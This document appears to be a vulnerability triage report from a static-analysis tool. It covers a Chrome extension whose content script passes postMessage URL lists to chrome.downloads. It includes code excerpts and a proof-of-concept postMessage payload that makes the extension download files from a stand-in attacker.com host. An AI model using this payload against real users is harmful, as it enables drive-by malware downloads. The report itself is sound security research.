# CoCo Analysis: dgfdpehcgeilbiifcaajajlcbfkaokfh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (all same flow, just different iterations)

---

## Sink 1: cs_window_eventListener_message → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgfdpehcgeilbiifcaajajlcbfkaokfh/opgen_generated_files/cs_3.js
Line 789   window.addEventListener('message', function (e) {
Line 791       var data = e.data;
Line 794       sdLoaded(data.urlList);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgfdpehcgeilbiifcaajajlcbfkaokfh/opgen_generated_files/bg.js
Line 1414      var url = urlList[i];
```

**Code:**

```javascript
// Content script (cs_3.js) - lines 789-798
window.addEventListener('message', function (e) {
    if (e.origin == window.location.origin) {  // Origin check (can be bypassed)
        var data = e.data;
        switch (data.type) {
            case 'sd-loaded':
            sdLoaded(data.urlList);  // ← attacker-controlled urlList
            break;
        }
    }
}, false);

// Content script - lines 783-786
function sdLoaded(urlList) {
    download({urlList: tempUrlList.concat(urlList)}, 0);  // ← passes to download function
    tempUrlList = null;
}

// Content script - lines 509-512
function download(urls, version) {
    _.runtime.sendMessage({
        type: 'download-mg',
        id: id,
        urlList: urls.urlList,  // ← sends attacker URLs to background
        version: version
    }, function (response) {
        // ...
    });
}

// Background script (bg.js) - lines 1404-1420
function downloadMg(urlList, id, version, sender, sendResponse) {
    var p_dirname = replace(KEYS.DIRNAME, true, sender);

    var promise = version ?
        downloadText(p_dirname, sender) :
        Promise.resolve();
    promise.then(function () {
        var downloads = [];
        var fails = [];
        for (var i = 0; i < urlList.length; i++) {
            var url = urlList[i];  // ← attacker-controlled URL
            if (url == null) {
                fails.push(i + 1);
            } else {
                var filename = (version ? '' : 's ') + (i + 1);
                downloads[i] = downloadMgMain(p_dirname, filename, url);  // ← downloads attacker URL
            }
        }
        // ...
    });
}

// Background script - lines 1395-1401
function downloadMgMain(p_dirname, filename, url) {
    var p_ext = getExt(url);
    return Promise.all([p_dirname, p_ext]).then(function (values) {
        var dirname = values[0], ext = values[1];
        return downloadAsync(url, dirname + '/' + filename + ext);
    });
}

// Background script - lines 1311-1321
function downloadAsync(url, filename) {
    return new Promise(function (resolve, reject) {
        _.downloads.download({
            url: url,  // ← attacker-controlled URL
            filename: filename
        }, function (downloadId) {
            // ...
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (via injected script context)

**Attack:**

```javascript
// On any page matching *://seiga.nicovideo.jp/*
// The extension injects inject.js into page context (line 803: script.src = _.runtime.getURL('inject.js'))
// Attacker can inject their own script or exploit XSS on seiga.nicovideo.jp to post message

// Malicious script running in page context:
window.postMessage({
    type: 'sd-loaded',
    urlList: [
        'https://attacker.com/malware.exe',
        'https://attacker.com/ransomware.exe',
        'https://attacker.com/trojan.exe'
    ]
}, window.location.origin);  // Origin check passes because script runs in page context

// The extension will trigger downloads of all URLs in the list
// User's browser will download malware without explicit consent
```

**Impact:** Arbitrary malicious downloads. An attacker who controls content on seiga.nicovideo.jp (via XSS, compromised ads, or malicious user-generated content) can trigger the extension to download arbitrary files to the user's system. The origin check (e.origin == window.location.origin) is not a security boundary because the extension injects its own script (inject.js) into the page context, and any malicious script in the page can post messages with the correct origin. This enables drive-by downloads of malware, ransomware, or other malicious executables. The extension has "downloads" permission in manifest.json, enabling the attack.

---

## Sink 2: cs_window_eventListener_message → chrome_downloads_download_sink

**Classification:** TRUE POSITIVE

**Reason:** Duplicate of Sink 1. Same flow, just a different iteration in the download loop.

---

## Sink 3: cs_window_eventListener_message → chrome_downloads_download_sink

**Classification:** TRUE POSITIVE

**Reason:** Duplicate of Sink 1. Same flow, just a different iteration in the download loop.

---

## Sink 4: cs_window_eventListener_message → chrome_downloads_download_sink

**Classification:** TRUE POSITIVE

**Reason:** Duplicate of Sink 1. Same flow, just a different iteration in the download loop.
